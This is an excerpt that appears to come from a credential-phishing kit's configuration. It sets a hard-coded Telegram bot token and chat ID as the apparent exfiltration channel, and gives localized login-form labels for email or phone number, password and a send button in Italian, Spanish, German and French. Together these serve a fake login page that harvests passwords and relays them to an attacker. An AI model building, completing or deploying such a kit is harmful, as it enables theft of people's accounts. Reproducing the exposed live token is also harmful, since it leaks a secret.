...
TELEGRAM_TOKEN = '7819706407:AAGdF6yUs6mBoF__oxDFDyfMorAJ_FS32Zw'
CHAT_ID = '-1002369087659'
...
LANGUAGES = {
    ...
    'it': {
        ...
        '3.name': 'Email o numero di telefono',
        '3.pass': 'Password',
        'Send': 'Invia',
    ...
    'es': {
        ...
        '3.name': 'Correo electrónico o número de teléfono',
        '3.pass': 'Contraseña',
        'Send': 'Enviar',
    ...
    'de': {
        ...
        '3.name': 'E-Mail oder Telefonnummer',
        '3.pass': 'Passwort',
        'Send': 'Absenden',
    ...
    'fr': {
        ...
        '3.name': 'E-mail ou numéro de téléphone',
        '3.pass': 'Mot de passe',
        'Send': 'Envoyer',
